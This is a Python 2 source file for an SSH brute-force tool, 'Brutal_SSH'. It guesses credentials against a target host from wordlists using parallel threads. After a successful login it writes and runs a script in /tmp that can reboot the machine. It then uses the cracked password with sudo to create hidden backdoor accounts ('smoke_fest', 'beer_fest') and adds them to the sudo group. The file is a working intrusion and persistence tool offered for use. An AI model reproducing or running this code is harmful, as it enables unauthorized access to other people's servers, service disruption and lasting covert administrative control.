#!venv/bin/python
from config import *
import argparse
from threading import Thread
import Queue
import paramiko
import socket
import sys
import time
import logging
import os


class Brutal_SSH():

    def __init__(self):
        self.__version__ = "1.0"
        self.host_ip = ""
        self.host_port = 22
        self.usernames = Queue.LifoQueue()
        self.passwords = Queue.LifoQueue()
        self.password_list = []
        self.threads = 4
        self.timeout = 5

    def do_bruteforce(self):
        use = "\r" + info_out + ffb + "python " + fgb + "brutal_ssh.py " + ffb + "-i Host [OPTION]" + sf
        parser = argparse.ArgumentParser(description='', usage=use)
        parser._optionals.title = ffb + "Basic Help Menu" + sf
        parser.add_argument('-i', '--ip', action="store", dest='host_ip', help='Target IP Address', required=True)
        parser.add_argument('-p', '--port', action="store", default=22, type=int, dest='host_port',
                            help='Target Port Number (Default 22)')
        parser.add_argument('-u', '--user', action="store", dest='user', help='SSH User name (Default root)')
        parser.add_argument('-U', '--usersfile', action="store", dest='usersfile', help='Usernames File Path')
        parser.add_argument('-P', '--passowrdsfile', action="store", default="wordlist/passfile.txt",
                            dest='passwordsfile', help='Passwords File Path')
        parser.add_argument('-t', '--threads', action="store", default=4, type=int, dest='threads',
                            help='No of threads (Default 4)')
        parser.add_argument('-T', '--timeout', action="store", default=5, type=int, dest='timeout',
                            help='Request timeout (Default 5)')
        # parser.add_argument('-o', '--output', action="store" , dest='output', help='Output file name')

        args = parser.parse_args()

        if not args.host_ip:
            print parser.print_help()
            exit()

        self.host_ip = args.host_ip
        self.host_port = args.host_port
        self.threads = args.threads
        self.timeout = args.timeout
        if args.user:
            self.usernames.put(args.user)
        elif args.usersfile:
            self.do_fill_queue(args.usersfile, True)
        if args.passwordsfile: self.do_fill_queue(args.passwordsfile, False)
        # print ver_out + "{}".format("Many SSH configuration limits the number of parallel")
        # print ver_out + "{}".format("connection, so it is recommended to reduce the task: use -t 4")
        self.go_brutal()

    def do_readfile(self, filename):
        try:
            with open(filename) as file:
                file_list = file.readlines()
                file_list = [line.strip() for line in file_list]
                return list(set(file_list))
        except IOError:
            print err_out + "File Not Found." + sf
            exit(0)

    def do_fill_queue(self, filename, flag=False):
        if flag:
            # print ver_out + "{:.<50}".format("Reading username file") + sf
            for username in self.do_readfile(filename):
                self.usernames.put(username)
        else:
            # print ver_out + "{:.<50}".format("Reading password file") + sf
            self.password_list = self.do_readfile(filename)

    def do_fill_pass_queue(self):
        for password in self.password_list:
            self.passwords.put(password)


    def do_brute_single(self, username):
        threads_list = []
        t_threads = self.threads + 1
        self.do_fill_pass_queue()
        for x in range(1, t_threads):
            time.sleep(4)
            thread = Thread(target=self.do_ssh, args=(username,))
            thread.start()
            threads_list.append(thread)

        for thread in threads_list:
            thread.join()

    def go_brutal(self):
        logging.basicConfig()
        paramiko_logger = logging.getLogger("paramiko.transport")
        paramiko_logger.disabled = True
        while not self.usernames.empty():
            self.do_brute_single(self.usernames.get())

    def do_ssh(self, username):
        while not self.passwords.empty():
            time.sleep(0.1)
            password = self.passwords.get()
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                PASSWORD = str(password)
                ssh.connect(self.host_ip, port=self.host_port, username=username, password=password,
                            timeout=self.timeout)
                print info_out + ffb + "{} : {:.<50} {}".format(username, password, fgb + "Successful" + sf)


                stdin, stdout, stderr = ssh.exec_command('whoami', timeout=1)
                data = stdout.read() + stderr.read()

                #print 'Whoami : ' +  data.replace("\n", "")

                if data.replace("\n", "") != 'root':
                    print 'Try run script with sudo'

                    #CREATE TEST SCRIPT
                    stdin, stdout, stderr = ssh.exec_command('echo \'#!/bin/bash\' > /tmp/test.sh', timeout=1)
                    stdin, stdout, stderr = ssh.exec_command('echo \'echo "Success"\' >> /tmp/test.sh', timeout=1)
                    stdin, stdout, stderr = ssh.exec_command('echo \'reboot\' >> /tmp/test.sh', timeout=1)

                    #CHMOD TEST SCRIPT WITH SUDO
                    stdin, stdout, stderr = ssh.exec_command('sudo chmod 777 /tmp/test.sh', timeout=1, get_pty=True)
                    time.sleep(0.5)
                    stdin.write(PASSWORD)
                    time.sleep(0.5)
                    stdin.write('\n')
                    time.sleep(0.5)
                    stdin.flush()

                    #RUN TEST SCRIPT
                    stdin, stdout, stderr = ssh.exec_command('/tmp/test.sh', timeout=1)
                    data = stdout.read() + stderr.read()

                    if 'Success' in data:
                        print 'It\'s work !'

                        print 'Try create backdoor user'
                        # CREATE BACKDOOR USER
                        stdin, stdout, stderr = ssh.exec_command('sudo adduser smoke_fest --disabled-password', timeout=2,
                                                                 get_pty=True)
                        time.sleep(0.5)
                        stdin.write(PASSWORD)
                        time.sleep(0.5)
                        stdin.write('\n')
                        time.sleep(0.5)
                        stdin.flush()

                        time.sleep(0.5)
                        stdin.write('\n')
                        stdin.flush()

                        time.sleep(0.5)
                        stdin.write('\n')
                        stdin.flush()

                        time.sleep(0.5)
                        stdin.write('\n')
                        stdin.flush()

                        time.sleep(0.5)
                        stdin.write('\n')
                        stdin.flush()

                        time.sleep(0.5)
                        stdin.write('Y\n')
                        stdin.flush()


                        time.sleep(0.5)
                        stdin.write('Y\n')
                        stdin.flush()

                        print 'passwd'
                        stdin, stdout, stderr = ssh.exec_command('sudo passwd smoke_fest', timeout=2,
                                                                 get_pty=True)

                        time.sleep(0.5)
                        stdin.write(PASSWORD + '\n')
                        stdin.flush()

                        time.sleep(0.5)
                        stdin.write(PASSWORD + '\n')
                        stdin.flush()

                        time.sleep(0.5)
                        stdin.write(PASSWORD +'\n')
                        stdin.flush()

                        print 'usermod'
                        stdin, stdout, stderr = ssh.exec_command('sudo usermod -aG sudo smoke_fest', timeout=2,
                                                                 get_pty=True)
                        time.sleep(0.5)
                        stdin.write(PASSWORD)
                        time.sleep(0.5)
                        stdin.write('\n')
                        time.sleep(0.5)
                        stdin.flush()

                    else:
                        print 'Don\'t work ;('

                elif data.replace("\n", "") == 'root':
                    print 'Try run script'

                    #CREATE TEST SCRIPT
                    stdin, stdout, stderr = ssh.exec_command('echo \'#!/bin/bash\' > /tmp/test.sh', timeout=1)
                    stdin, stdout, stderr = ssh.exec_command('echo \'echo "Success"\' >> /tmp/test.sh', timeout=1)
                    #stdin, stdout, stderr = ssh.exec_command('echo \'shutdown -h now\' >> /tmp/test.sh', timeout=1)

                    #CHMOD TEST SCRIPT
                    stdin, stdout, stderr = ssh.exec_command('chmod 777 /tmp/test.sh', timeout=1)

                    #RUN TEST SCRIPT
                    stdin, stdout, stderr = ssh.exec_command('/tmp/test.sh', timeout=1)
                    data = stdout.read() + stderr.read()

                    if 'Success' in data:
                        print 'It\'s work !'

                        print 'Try create backdoor user'
                        #CREATE BACKDOOR USER
                        stdin, stdout, stderr = ssh.exec_command('sudo adduser beer_fest --disabled-password', timeout=2, get_pty=True)

                        time.sleep(0.5)
                        stdin.write('\n')
                        stdin.flush()

                        time.sleep(0.5)
                        stdin.write('\n')
                        stdin.flush()

                        time.sleep(0.5)
                        stdin.write('\n')
                        stdin.flush()

                        time.sleep(0.5)
                        stdin.write('\n')
                        stdin.flush()

                        time.sleep(0.5)
                        stdin.write('\n')
                        stdin.flush()

                        time.sleep(0.5)
                        stdin.write('Y\n')
                        stdin.flush()

                        print 'passwd'
                        stdin, stdout, stderr = ssh.exec_command('passwd beer_fest', timeout=2,
                                                                 get_pty=True)

                        time.sleep(0.5)
                        stdin.write(PASSWORD + '\n')
                        stdin.flush()

                        time.sleep(0.5)
                        stdin.write(PASSWORD + '\n')
                        stdin.flush()

                        print 'usermod'
                        stdin, stdout, stderr = ssh.exec_command('usermod -aG sudo beer_fest', timeout=2,
                                                                 get_pty=True)
                        time.sleep(0.5)
                        data = stdout.read() + stderr.read()

                        print data

                    else:
                        print 'Don\'t work ;('

                ssh.close()
                os.system('kill %d' % os.getpid())
            except paramiko.AuthenticationException:
                print ver_out + ffb + "{} : {:.<50} {}".format(username, password, frb + "Failed" + sf)
                os.system('kill %d' % os.getpid())
            except socket.error, e:
                print err_out + ffb + "{} : {:.<50} {}".format(username, password, fcb + "Connection Failed" + sf)
                os.system('kill %d' % os.getpid())
            except paramiko.SSHException:
                print err_out + ffb + "{} : {:.<50} {}".format(username, password, fbb + "Error" + sf)
                os.system('kill %d' % os.getpid())


if __name__ == '__main__':
    start = time.time()
    brutal_shh = Brutal_SSH()
    brutal_shh.do_bruteforce()
    end = time.time()
    print "\n"
    print "-" * 20
    print end - start
    print "-" * 20
